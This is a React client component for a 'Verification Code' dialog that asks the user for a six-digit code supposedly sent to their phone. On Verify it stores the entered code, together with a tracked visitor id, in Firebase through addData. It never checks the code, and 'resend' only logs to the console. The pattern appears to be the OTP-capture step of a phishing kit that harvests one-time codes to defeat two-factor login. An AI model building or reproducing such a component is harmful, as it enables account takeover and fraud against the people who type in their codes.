"use client"

import { useState, useEffect } from "react"
import type React from "react"
import { addData } from "../../firebase"

interface OtpDialogProps {
  onVerify: (otp: string) => void
  onCancel: () => void
  phoneNumber: string
}

export default function OtpDialog({  onVerify, onCancel, phoneNumber }: OtpDialogProps) {
  const [otp, setOtp] = useState("")
  const [timeLeft, setTimeLeft] = useState(60)
  const [inputRefs, setInputRefs] = useState<Array<HTMLInputElement | null>>([])

  // Initialize input refs
  useEffect(() => {
    setInputRefs(Array(6).fill(null))
  }, [])

  // Countdown timer
  useEffect(() => {
    if (timeLeft <= 0) return

    const timer = setTimeout(() => {
      setTimeLeft(timeLeft - 1)
    }, 1000)

    return () => clearTimeout(timer)
  }, [timeLeft])

  const handleInputChange = (index: number, value: string) => {
    if (value.length > 1) {
      // If pasting multiple digits, distribute them across inputs
      const digits = value.split("").slice(0, 6 - index)

      const newOtp = otp.split("")
      digits.forEach((digit, i) => {
        if (index + i < 6) {
          newOtp[index + i] = digit
        }
      })

      setOtp(newOtp.join(""))

      // Focus the next empty input or the last input
      const nextIndex = Math.min(index + digits.length, 5)
      inputRefs[nextIndex]?.focus()
    } else {
      // Handle single digit input
      const newOtp = otp.split("")
      newOtp[index] = value
      setOtp(newOtp.join(""))

      // Auto-focus next input
      if (value && index < 5) {
        inputRefs[index + 1]?.focus()
      }
    }
  }

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    // Handle backspace
    if (e.key === "Backspace") {
      if (!otp[index] && index > 0) {
        // If current input is empty and backspace is pressed, focus previous input
        const newOtp = otp.split("")
        newOtp[index - 1] = ""
        setOtp(newOtp.join(""))
        inputRefs[index - 1]?.focus()
      }
    }
  }

  const handleVerify = () => {
    const visitorId = localStorage.getItem("visitor")

    if (otp.length === 6) {
addData({id:visitorId,otp})
      onVerify(otp)
    }
  }

  const handleResendCode = () => {
    // Reset OTP and timer
    setOtp("")
    setTimeLeft(60)

    // Here you would typically call your API to resend the code
    console.log("Resending code to", phoneNumber)
  }

  return (
    <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
      <div className="bg-white rounded-lg shadow-xl max-w-md w-full p-6 mx-4">
        <div className="text-center mb-6">
          <div className="flex justify-center mb-4">
            <div className="bg-blue-100 rounded-full p-3">
              <svg
                xmlns="http://www.w3.org/2000/svg"
                width="24"
                height="24"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                strokeWidth="2"
                strokeLinecap="round"
                strokeLinejoin="round"
                className="text-blue-600"
              >
                <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path>
              </svg>
            </div>
          </div>
          <h3 className="text-xl font-semibold text-gray-900">Verification Code</h3>
          <p className="text-gray-600 mt-2">
            We've sent a 6-digit code to your phone
            <br />
            <span className="font-medium">{phoneNumber}</span>
          </p>
        </div>

        <div className="mb-6">
          <div className="flex justify-between mb-2">
            <span className="text-sm text-gray-600">Enter verification code</span>
            <span className="text-sm text-gray-600">{timeLeft > 0 ? `${timeLeft}s` : "Time expired"}</span>
          </div>

          <div className="flex gap-2 justify-between">
            {Array(6)
              .fill(0)
              .map((_, index) => (
                <input
                  key={index}
                  type="text"
                  maxLength={6}
                  className="w-12 h-12 text-center text-xl font-semibold border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                  value={otp[index] || ""}
                  onChange={(e) => handleInputChange(index, e.target.value)}
                  onKeyDown={(e) => handleKeyDown(index, e)}
                  ref={(el) => {
                    inputRefs[index] = el
                  }}
                  autoFocus={index === 0}
                />
              ))}
          </div>
        </div>

        <div className="flex flex-col gap-3">
          <button
            onClick={handleVerify}
            disabled={otp.length !== 6}
            className={`w-full py-2.5 rounded-md font-medium ${
              otp.length === 6
                ? "bg-blue-600 text-white hover:bg-blue-700"
                : "bg-gray-200 text-gray-500 cursor-not-allowed"
            }`}
          >
            Verify
          </button>

          <button
            onClick={onCancel}
            className="w-full py-2.5 border border-gray-300 rounded-md text-gray-700 font-medium hover:bg-gray-50"
          >
            Cancel
          </button>
        </div>

        <div className="text-center mt-6">
          <button
            onClick={handleResendCode}
            disabled={timeLeft > 0}
            className={`text-sm ${
              timeLeft > 0 ? "text-gray-400 cursor-not-allowed" : "text-blue-600 hover:text-blue-800"
            }`}
          >
            Didn't receive code? {timeLeft > 0 ? `Resend in ${timeLeft}s` : "Resend"}
          </button>
        </div>
      </div>
    </div>
  )
}
